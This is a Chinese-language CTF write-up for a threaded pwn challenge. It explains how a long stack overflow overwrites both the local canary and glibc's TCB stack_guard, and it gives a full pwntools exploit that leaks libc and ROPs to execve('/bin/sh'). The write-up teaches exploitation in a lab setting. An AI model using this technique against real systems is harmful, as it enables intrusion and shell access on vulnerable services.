# enter_the_evil_pwn_land

## 题目简述

程序在线程函数中提供了接近 `0x1000` 字节的栈溢出，但启用了 Canary。常规做法需要泄露 canary；本题的特殊点是线程控制块 TCB 与线程栈位于同一片映射附近，超长溢出不仅能覆盖栈上的 canary，还能覆盖 TCB 中作为比较基准的 `stack_guard`。只要把两处改成相同值，就能绕过检查并执行 ROP。

## 解题过程

x86-64 glibc 在线程局部存储中保存栈保护值。函数入口和退出处常见的访问形式为：

```asm
mov rax, qword ptr fs:[0x28]
```

`fs` 基址指向当前线程的 TCB，`tcbhead_t` 开头的关键字段布局为：

```c
struct tcbhead_t {
    void *tcb;             // +0x00
    void *dtv;             // +0x08
    void *self;            // +0x10
    int multiple_threads;  // +0x18
    int gscope_flag;       // +0x1c
    uintptr_t sysinfo;     // +0x20
    uintptr_t stack_guard; // +0x28
};
```

在 GDB 中切换到执行漏洞函数的线程，用 `fsbase`、`x/20gx $fs_base` 和 `vmmap` 检查布局，可以确认：

- TCB 的 `stack_guard` 正好位于 `fsbase + 0x28`；
- 漏洞缓冲区起点到 TCB 起点的距离为 `0x840`；
- 栈帧内局部缓冲区到本地 canary 的距离为 `0x28`。

程序第一次回显会泄露邻接的 TCB 地址。原题输出中地址最低字节为 `0x00`，因此需要在收到的 7 字节前补零：

```python
io.sendline(b"A" * 0x20)
io.recvline()
fs_tail = io.recvline().rstrip(b"\n")
fsbase = u64((b"\x00" + fs_tail).ljust(8, b"\x00"))
```

第一阶段将栈上的 canary 写为 0，布置 `puts(puts@got)` 泄露 libc，然后把载荷补到 TCB。TCB 的前三个指针尽量保留为已泄露的 `fsbase`，同时把 `stack_guard` 写为 0。这样函数退出时比较的是“栈上 0”和“TCB 中 0”，检查通过：

```python
from pwn import *

context.arch = "amd64"
elf = ELF("./a.out", checksec=False)
libc = ELF("./libc-2.31.so", checksec=False)
io = remote("challenge.example", 10000)

test_thread = 0x4011d6
pop_rdi = 0x401363

# 第一次短输入触发原题中的邻接指针泄露。
io.sendline(b"A" * 0x20)
io.recvline()
fs_tail = io.recvline().rstrip(b"\n")
fsbase = u64((b"\x00" + fs_tail).ljust(8, b"\x00"))

stage1 = flat(
    b"A" * 0x28,
    0,                    # 栈上的 canary
    0,                    # saved rbp
    pop_rdi,
    elf.got["puts"],
    elf.plt["puts"],
    test_thread,
)
stage1 = stage1.ljust(0x840, b"\x00")
stage1 += flat(
    fsbase, fsbase, fsbase,  # tcb、dtv、self
    0,                       # multiple_threads 与 gscope_flag
    0,                       # sysinfo
    0,                       # stack_guard
)
io.sendline(stage1)

io.recvline()
puts_addr = u64(io.recvline().rstrip(b"\n").ljust(8, b"\x00"))
libc.address = puts_addr - libc.sym["puts"]

pop_rsi = libc.address + 0x27529
pop_rdx_r12 = libc.address + 0x11c371
bin_sh = next(libc.search(b"/bin/sh\x00"))

# TCB 的 stack_guard 已在第一阶段改成 0，第二阶段只需保持本地值为 0。
stage2 = flat(
    b"A" * 0x28,
    0,
    0,
    pop_rdi,
    bin_sh,
    pop_rsi,
    0,
    pop_rdx_r12,
    0,
    0,
    libc.sym["execve"],
)
io.sendline(stage2)
io.interactive()
```

直接用同一填充值覆盖本地 canary 和 `stack_guard` 也可能成功，但会同时破坏 `tcb`、`dtv`、`self` 等字段，稳定性更差。上面的做法先恢复 TCB 基址，再尽量保留关键指针。第二阶段选择 `execve("/bin/sh", NULL, NULL)`，避免 `system` 等库函数在受损的线程状态上执行额外逻辑。

## 方法总结

Canary 的安全性不仅取决于栈上副本，还取决于比较基准是否不可写。本题利用超长线程栈溢出同时改写局部 canary 和 TLS/TCB 中的 `stack_guard`，从根本上消除了比较差异。复现时必须在正确线程中测量缓冲区、TCB 和 `fsbase` 的关系，并尽量减少对 TCB 其他字段的破坏。
